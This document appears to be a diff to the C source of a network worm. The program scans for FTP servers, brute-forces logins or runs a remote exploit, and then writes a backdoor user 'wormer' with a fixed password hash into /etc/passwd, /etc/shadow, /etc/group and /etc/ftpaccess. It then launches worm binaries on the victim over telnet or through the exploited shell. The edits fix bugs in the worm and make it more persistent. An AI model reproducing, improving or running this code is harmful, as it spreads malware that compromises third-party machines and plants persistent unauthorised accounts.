@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include <ifaddrs.h>
 //---
 #include "scanner.h"
@@ -56,8 +57,9 @@ int main(int argc, char *const *argv) {
   struct bruteforce_arguments args[MAX_THREADS];
   struct ifaddrs *addresses, *ifa;
   struct sockaddr_in *addr;
-  char cmd_buffer[256];
+  char cmd_buffer[512];
   char telnet_buffer[256];
+  char ftp_user[32];
   char range[32];
   char *interface = NULL;
   int shell_fd, method, opt, err;
@@ -135,10 +137,11 @@ int main(int argc, char *const *argv) {
   if(target_table != NULL) {
     for(target = target_table; target != NULL; target = target->next) {
       if(strstr(target->banner, "FTP") != NULL) {
+        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
         fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
 
-
-        if((method = rand() % 2) == 0) {
+        method = rand() % 2;
+        if(method == 0) {
 _bruteforce:
           fprintf(stdout, "Performing brute-force attack...\n");
 
@@ -147,30 +150,39 @@ _bruteforce:
             args[i].thread_id = i;
 
             if((err = pthread_create(&threads[i], NULL, &try_bruteforce, (void *) &args[i])) != 0) {
-              fprintf(stderr, "Couldn't create thread \"%d\": %s\n", strerror(err));
+              fprintf(stderr, "Couldn't create thread \"%d\": %s\n", i, strerror(err));
             }
           }
 
           for(i = 0; i < MAX_THREADS; ++i) {
             pthread_join(threads[i], NULL);
           }
+
+          strncpy(ftp_user, FTP_USER, sizeof ftp_user);
         }
 
         if(ftp_fd == 0) {
           fprintf(stdout, "Using exploit to add FTP user...\n");
           length = snprintf(cmd_buffer, sizeof cmd_buffer,
-                    "useradd -p \\$1\\$Q.BMJBRg\\$DDb.ITROcDJ.ctYyqdVfA0 wormer\n");
+                    "echo \"wormer:x:9999:9999::/home/wormer:/bin/bash\" >> /etc/passwd ; "
+                    "echo \"wormer:\\$1\\$Q.BMJBRg\\$DDb.ITROcDJ.ctYyqdVfA0:17156:0:99999:7:::\" >> /etc/shadow ; "
+                    "echo \"wormer:x:99999:\" >> /etc/group ; "
+                    "echo \"allow-uid wormer\" >> /etc/ftpaccess ; "
+                    "echo \"allow-gid wormer\" >> /etc/ftpaccess ; "
+                    "mkdir -p /home/wormer && chown wormer:wormer /home/wormer ;\n");
 
-          fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
+          fprintf(stdout, "Command to be executed (%u):\n%s\n", length, cmd_buffer);
 
-          shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
-          write(shell_fd, cmd_buffer, length);
-          close(shell_fd);
+          if(shell_fd != 0) {
+            write(shell_fd, cmd_buffer, length);
+          }
+
+          sleep(5);
 
           if((ftp_fd = ftp_try_login(target->address, target->port, "wormer", "ABC", 0)) <= 0) {
             fprintf(stdout, "Failed to get FTP access using exploit!\n");
             if(method == 1) {
-              method = 0;
+              method = 2;
               goto _bruteforce;
             }
 
@@ -178,6 +190,7 @@ _bruteforce:
             return -1;
           }
 
+          strncpy(ftp_user, "wormer", sizeof ftp_user);
           fprintf(stdout, "FTP access granted using exploit!\n");
         }
 
@@ -200,28 +213,27 @@ _telnet:
           fprintf(stdout, "Executing worm remotely using telnet...\n");
           length = snprintf(telnet_buffer, sizeof telnet_buffer,
                     "./worm.expect worm.telnet %s 23 %s %s %s 1-1024",
-                    target->address, FTP_USER, ftp_password, range);
+                    target->address, ftp_user, ftp_password, range);
 
           if(system(telnet_buffer) != 0) {
             fprintf(stdout, "Failed to execute worm remotely using telnet!\n");
+          } else {
+            goto _success;
           }
-
-          goto _success;
         }
 
         fprintf(stdout, "Executing worm remotely using exploit...\n");
 
         length = snprintf(cmd_buffer, sizeof cmd_buffer,
                   "chmod +x ~%s/worm* ; "
-                  "~%s/worm %s 1-1024 ; "
-                  "~%s/worm.i686 %s 1-1024\n", 
-                  FTP_USER, FTP_USER, range, FTP_USER, range);
+                  "nohup ~%s/worm %s 1-1024 ; "
+                  "nohup ~%s/worm.i686 %s 1-1024 ;\n", 
+                  ftp_user, ftp_user, range, ftp_user, range);
 
-        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
+        fprintf(stdout, "Command to be executed (%u):\n%s\n", length, cmd_buffer);
 
-        if((shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@")) > 0) {
+        if(shell_fd > 0) {
           write(shell_fd, cmd_buffer, length);
-          close(shell_fd);
         } else {
           fprintf(stdout, "Failed to execute worm remotely using exploit!\n");
 
@@ -233,6 +245,7 @@ _telnet:
 
 _success:
         fprintf(stdout, "Attack completed!\n");
+        close(shell_fd);
       }
     }
   }
